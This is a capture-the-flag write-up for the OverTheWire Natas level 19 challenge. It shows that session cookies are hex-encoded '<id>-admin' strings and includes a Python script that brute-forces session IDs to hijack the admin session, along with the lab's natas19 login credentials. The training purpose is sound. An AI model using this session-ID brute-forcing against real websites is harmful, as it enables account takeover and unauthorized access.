# Level 19 -> Level 20

The PHPSESSION id is in hex which when decoded gives  

```
3438352d61646d696e -> 485-admin
```

let's try bruteforcing the value 485 from 1 through 640 as the page said that it mostly uses the code from before  

```python
import requests

target = 'http://natas19.natas.labs.overthewire.org/'
auth = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
params = dict(username='admin', password='anyrandomword')
cookies = dict()

max_s_id = 640
s_id = 1

while s_id <= max_s_id:
        print("Trying with PHPSESSID =", s_id)
        s_id_hex = f'{s_id}-admin'.encode('utf_8').hex()
        cookies = dict(PHPSESSID=s_id_hex)
        r = requests.get(target, auth=auth, params=params, cookies=cookies)
        if "You are logged in as a regular user" not in r.text:
                print(r.text)
                break
        s_id += 1
```
